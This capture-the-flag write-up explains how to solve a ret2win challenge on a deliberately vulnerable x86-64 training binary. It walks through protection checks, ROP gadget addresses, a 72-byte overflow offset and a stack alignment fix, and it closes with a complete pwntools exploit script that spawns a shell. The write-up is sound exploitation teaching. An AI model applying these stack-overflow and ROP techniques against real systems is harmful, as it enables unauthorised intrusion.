## Escape Room - ret2win with Args (ROP)

### The Vulnerable Code and the Core Problem

In the previous exercises, reaching `win()` was sufficient on its own, but here the function imposes a condition before spawning a shell, checking whether `arg1 == 0xdeadbeef` and `arg2 == 0xcafebabe`. Simply redirecting RIP to `win()` is not enough, because on entry the registers `rdi` and `rsi` will contain whatever garbage happened to be there, and the check will fail.

On x86-64, the calling convention dictates that the first argument is passed in `rdi` and the second in `rsi`, so what you actually need to do is set both registers to the expected values before the call to `win()` reaches its condition check. A plain buffer overflow cannot write directly into registers, which is exactly why a ROP chain is necessary here.

### Phase 1 - Reconnaissance

The protection profile from `checksec` is as follows:

|Protection|Status|Meaning|
|---|---|---|
|NX|Enabled|The stack is not executable, so shellcode is off the table|
|PIE|Disabled|All addresses are fixed on every run, so `win()` and the gadgets are always at the same location|
|Canary|Not found|The overflow can proceed straight to RIP without any bypass|

NX being on rules out shellcode injection, but PIE being off is what makes this entire approach tractable, because it means every address you need is static and can be hardcoded in the exploit.

### Phase 2 - Finding the Gadgets

The binary conveniently provides `pop rdi; ret` and `pop rsi; ret` as inline assembly in a `gadgets()` function, which is an intentional hint from the challenge author. Each of these gadgets pops the next value off the stack into the target register and then executes `ret`, which pops the following address off the stack and jumps there. This chaining behavior is the foundation of every ROP chain.

You locate the addresses with the following commands:
```bash
nm ./escape_room | grep win
ROPgadget --binary ./escape_room | grep "pop rdi"
ROPgadget --binary ./escape_room | grep "pop rsi"
ROPgadget --binary ./escape_room | grep ": ret$"
```

<div class="page-break"></div>

The results for this binary are:

| What | Address |
|---|---|
| `pop rdi; ret` | `0x401287` |
| `pop rsi; ret` | `0x401289` |
| `win()` | `0x40121b` |
| `ret` (alignment) | `0x40101a` |

The bare `ret` gadget is needed because `system()` internally uses SSE instructions that require the stack pointer to be 16-byte aligned on entry, and the chain as built would leave the stack misaligned by 8 bytes without it.

### Phase 3 - Computing the Offset

The offset is found the usual way, by generating a cyclic pattern with pwntools, passing it to the binary under GDB, and recovering the offset from the crash. For this binary the result is 72 bytes, which covers the 64-byte buffer plus the 8-byte saved RBP slot.

### Phase 4 - Understanding the ROP Chain

When `vuln()` executes its `ret` instruction, the CPU fetches the next value off the stack and jumps to it. The full stack layout at that moment must look like this:
```
[ 72 bytes padding      ]  ← fill buffer and saved RBP
[ pop rdi; ret  (addr)  ]  ← CPU jumps here, pops next value into rdi
[ 0xdeadbeef            ]  ← popped into rdi
[ pop rsi; ret  (addr)  ]  ← CPU jumps here, pops next value into rsi
[ 0xcafebabe            ]  ← popped into rsi
[ ret           (addr)  ]  ← stack alignment fix
[ win()         (addr)  ]  ← rdi and rsi are now correct, condition passes
````

Each gadget ends with `ret`, which consumes the next entry on the stack as the new instruction pointer, effectively chaining the gadgets together in sequence.

### Phase 5 - The Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./escape_room")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_RIP = 72

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET  = 0x000000000040101a   # ret — stack alignment
POP_RDI = 0x0000000000401287
POP_RSI = 0x0000000000401289

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_RIP,   # fill buffer + saved RBP
        p64(POP_RDI),            # gadget: pop rdi; ret
        p64(0xdeadbeef),         # arg1 → rdi
        p64(POP_RSI),            # gadget: pop rsi; ret
        p64(0xcafebabe),         # arg2 → rsi
        p64(GADGET),             # ret — align stack to 16 bytes
        p64(exe.sym.win),        # jump to win() with correct arguments
    )

    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```

